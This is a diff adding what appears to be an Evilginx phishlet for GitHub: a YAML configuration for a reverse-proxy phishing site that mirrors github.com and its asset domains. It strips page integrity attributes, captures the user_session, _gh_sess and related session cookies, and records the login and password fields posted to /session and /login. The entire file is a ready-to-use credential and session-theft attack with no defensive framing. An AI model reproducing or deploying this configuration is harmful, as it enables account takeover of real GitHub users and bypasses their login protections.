@@ -1,0 +1,31 @@
+author: '@audibleblink'
+min_ver: '3.0.0'
+redirect_url: 'https://github.com/'
+proxy_hosts:
+  - {phish_sub: '', orig_sub: '', domain: 'github.com', session: true, is_landing: true, auto_filter: true}
+  - {phish_sub: 'api', orig_sub: 'api', domain: 'github.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'github', orig_sub: 'github', domain: 'githubassets.com', session: false, is_landing: false, auto_filter: true}
+sub_filters:
+  - {triggers_on: 'github.com', orig_sub: '', domain: 'github.com', search: 'integrity="(.*?)"', replace: '', mimes: ['text/html']}
+auth_tokens:
+  - domain: '.github.com'
+    keys: ['logged_in:always','dotcom_user:always']
+    type: 'cookie'
+  - domain: 'github.com'
+    keys: ['user_session:always','_gh_sess:always']
+    type: 'cookie'
+auth_urls:
+  - '/session'
+  - '/login'
+credentials:
+  username:
+    key: 'login'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+login:
+  domain: 'github.com'
+  path: '/login'
